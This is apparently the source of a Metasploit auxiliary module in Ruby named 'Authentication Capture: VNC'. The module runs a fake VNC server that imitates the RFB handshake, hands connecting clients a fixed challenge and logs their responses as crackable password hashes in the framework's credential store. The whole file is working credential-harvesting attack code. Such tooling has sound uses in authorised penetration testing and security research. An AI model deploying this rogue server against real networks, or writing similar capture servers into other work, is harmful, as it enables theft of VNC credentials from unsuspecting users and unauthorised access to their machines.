##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: VNC',
      'Description' => %q{
        This module provides a fake VNC service that
      is designed to capture authentication credentials.
      },
      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License' => MSF_LICENSE,
      'Actions' => [[ 'Capture', { 'Description' => 'Run VNC capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    register_options(
      [
        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5900 ]),
        OptString.new('CHALLENGE', [ true, 'The 16 byte challenge', '00112233445566778899AABBCCDDEEFF' ])
      ]
    )
  end

  def setup
    super
    @state = {}
  end

  def run
    if datastore['CHALLENGE'].to_s =~ /^([a-fA-F0-9]{32})$/
      @challenge = [ datastore['CHALLENGE'] ].pack('H*')
    else
      fail_with(Failure::BadConfig, 'CHALLENGE must be 32 characters, 0-9,A-F.')
    end
    exploit
  end

  def on_client_connect(client)
    @state[client] = {
      name: "#{client.peerhost}:#{client.peerport}",
      ip: client.peerhost,
      port: client.peerport,
      pass: nil,
      chall: nil,
      proto: nil
    }

    client.put "RFB 003.007\n"
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :nonreplayable_hash,
      jtr_format: Metasploit::Framework::Hashes.identify_hash(opts[:password])
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def on_client_data(client)
    data = client.get_once
    return if !data

    peer = "#{client.peerhost}:#{client.peerport}"

    if data =~ /^RFB (.*)\n$/
      @state[client][:proto] = Regexp.last_match(1)
      if @state[client][:proto] == '003.007'
        # for the 003.007 protocol we say we support the VNC sectype
        # and wait for the server to acknowledge it, before we send the
        # challenge.
        client.put [0x0102].pack('n') # 1 sectype, unencrypted
      elsif @state[client][:proto] == '003.003'
        # for the 003.003 protocol we say we support the VNC sectype
        # and immediately send the challenge
        sectype = [0x00000002].pack('N')
        client.put sectype

        @state[client][:chall] = @challenge
        client.put @state[client][:chall]
      else
        client.close
      end
    # the challenge was sent, so this should be our response
    elsif @state[client][:chall]
      client.put [0x00000001].pack('N')
      client.close
      print_good("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
      hash_line = "*#{@state[client][:chall].unpack('H*')[0]}*#{data.unpack('H*')[0]}"
      report_cred(
        ip: client.peerhost,
        port: datastore['SRVPORT'],
        service_name: 'vnc_client',
        user: '',
        password: hash_line,
        proof: hash_line
      )

    # we have got the protocol sorted out and have offered the VNC sectype (2)
    elsif @state[client][:proto] == '003.007'
      if (data.unpack('C')[0] != 2)
        print_error("#{peer} - sectype not offered! #{data.unpack('H*')}")
        client.close
        return
      end
      @state[client][:chall] = @challenge
      client.put @state[client][:chall]
    end
  end

  def on_client_close(client)
    @state.delete(client)
  end
end
